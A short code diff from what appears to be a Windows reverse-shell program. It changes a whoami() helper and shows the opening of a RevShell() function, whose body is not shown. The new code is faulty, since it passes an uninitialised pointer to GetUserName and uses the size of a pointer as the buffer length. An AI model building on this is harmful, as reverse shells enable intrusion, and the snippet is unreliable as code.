@@ -7,11 +7,13 @@
 // DEBUG, TEMP.
 #include <iostream>
 
-void whoami(char* returnval, int returnsize)
+void whoami(char *returnval, int returnsize)
 {
 	DWORD bufferlen = 257;
 	// Call WINAPI method, assign it's response to returnval pointer.
-	GetUserName(returnval, &bufferlen);
+	LPWSTR ami;
+	GetUserName(ami, &bufferlen);
+	wcstombs(returnval,ami,sizeof(returnval));
 }
 
 void RevShell()
